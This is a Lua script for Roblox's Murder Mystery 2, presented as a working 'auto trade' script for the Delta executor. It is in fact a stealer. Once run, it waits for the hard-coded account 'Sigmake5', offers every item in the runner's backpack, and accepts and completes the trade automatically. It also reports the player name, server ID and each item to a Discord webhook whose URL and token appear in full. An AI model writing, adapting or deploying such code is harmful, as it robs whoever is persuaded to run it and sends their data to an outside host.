-- -- WORKING MM2 AUTO TRADE SCRIPT FOR DELTA
-- Based on actual MM2 remotes from your debug

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Discord webhook
local function sendLog(message)
    pcall(function()
        local data = HttpService:JSONEncode({
            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`\nTime: `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
        })
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

-- Get all items from backpack
local function getAllItems()
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item)
            sendLog("Found item: " .. item.Name)
        end
    end
    return items
end

-- Send trade request to target
local function sendTradeRequest(targetPlayer)
    local startTradeRemote = ReplicatedStorage:FindFirstChild("StartTrade")
    if startTradeRemote then
        pcall(function()
            startTradeRemote:FireServer(targetPlayer)
            sendLog("Trade request sent to " .. TARGET_USER)
            return true
        end)
    else
        sendLog("StartTrade remote not found!")
        return false
    end
end

-- Offer item to trade
local function offerItem(item)
    local offerItemRemote = ReplicatedStorage:FindFirstChild("OfferItem")
    if offerItemRemote then
        pcall(function()
            offerItemRemote:FireServer(item)
            sendLog("Offered: " .. item.Name)
            return true
        end)
    end
    return false
end

-- Accept trade
local function acceptTrade()
    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
    if acceptTradeRemote then
        pcall(function()
            acceptTradeRemote:FireServer()
            sendLog("Trade accepted")
            return true
        end)
    end
    return false
end

-- Accept trade request
local function acceptRequest()
    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
    if acceptRequestRemote then
        pcall(function()
            acceptRequestRemote:FireServer()
            sendLog("Request accepted")
            return true
        end)
    end
    return false
end

-- Complete trade
local function completeTrade()
    local completeTradeRemote = ReplicatedStorage:FindFirstChild("CompleteTrade")
    if completeTradeRemote then
        pcall(function()
            completeTradeRemote:FireServer()
            sendLog("Trade completed")
            return true
        end)
    end
    return false
end

-- Listen for incoming trade requests from Sigmake5
local function setupTradeListener()
    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
    
    -- Listen for any trade-related events
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                for _, arg in pairs(args) do
                    if type(arg) == "table" and arg.Name == TARGET_USER then
                        sendLog(TARGET_USER .. " sent a trade request!")
                        wait(1)
                        -- Auto accept and send items
                        acceptRequest()
                        wait(1)
                        local items = getAllItems()
                        for _, item in pairs(items) do
                            offerItem(item)
                            wait(0.3)
                        end
                        wait(1)
                        acceptTrade()
                        wait(0.5)
                        completeTrade()
                        sendLog("Trade completed with " .. TARGET_USER)
                    elseif type(arg) == "string" and arg == TARGET_USER then
                        sendLog("Trade event from " .. TARGET_USER)
                    end
                end
            end)
        end
    end
end

-- Main trade function
local tradeInProgress = false

local function startTradeWithTarget(targetPlayer)
    if tradeInProgress then
        sendLog("Trade already in progress")
        return
    end
    tradeInProgress = true
    
    sendLog("Starting trade with " .. targetPlayer.Name)
    
    -- Get all items first
    local items = getAllItems()
    sendLog("Found " .. #items .. " items to trade")
    
    if #items == 0 then
        sendLog("No items found in backpack!")
        tradeInProgress = false
        return
    end
    
    -- Send trade request
    local sent = sendTradeRequest(targetPlayer)
    if not sent then
        tradeInProgress = false
        return
    end
    
    -- Wait for them to accept
    wait(3)
    
    -- Offer all items
    for _, item in pairs(items) do
        offerItem(item)
        wait(0.3)
    end
    
    wait(1)
    
    -- Accept and complete
    acceptTrade()
    wait(0.5)
    completeTrade()
    
    sendLog("Trade completed! " .. #items .. " items sent to " .. TARGET_USER)
    tradeInProgress = false
end

-- Watch for Sigmake5 joining
local function watchForTarget()
    sendLog("Watching for " .. TARGET_USER)
    sendLog("Player: " .. player.Name)
    sendLog("Server ID: " .. game.JobId)
    
    -- Setup listener
    setupTradeListener()
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog(TARGET_USER .. " is already in server!")
            wait(2)
            startTradeWithTarget(plr)
            return
        end
    end
    
    -- Watch for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog(TARGET_USER .. " joined the server!")
            wait(3)
            startTradeWithTarget(newPlayer)
        end
    end)
end

-- Start the script
sendLog("MM2 Auto Trade Script Loaded for Delta")
watchForTarget()

print("✅ MM2 Auto Trade Active - Delta")
print("🎯 Waiting for Sigmake5 to join...")
print("📦 Will trade all items in your backpack")
